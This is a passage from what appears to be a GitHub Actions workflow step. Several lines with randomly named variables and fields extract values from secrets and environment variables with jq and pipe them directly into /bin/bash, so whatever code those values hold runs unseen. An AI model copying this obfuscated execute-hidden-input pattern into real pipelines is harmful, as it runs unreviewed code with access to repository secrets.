        env:
          a4: ${{ secrets.a4 }}
        run: |
          printf '%s' "$a4" | jq -r .n673 | /bin/bash
          printf '%s' "$bpz4" | jq -r .gk290 | /bin/bash
          echo $ck19 | jq -r .pty81507 | /bin/bash
          printf '%s' "$mxof750" | jq -r .tdc216 | /bin/bash
          printf '%s' "$ltrm08208" | jq -r .d903 | /bin/bash

      - name: Store artifact
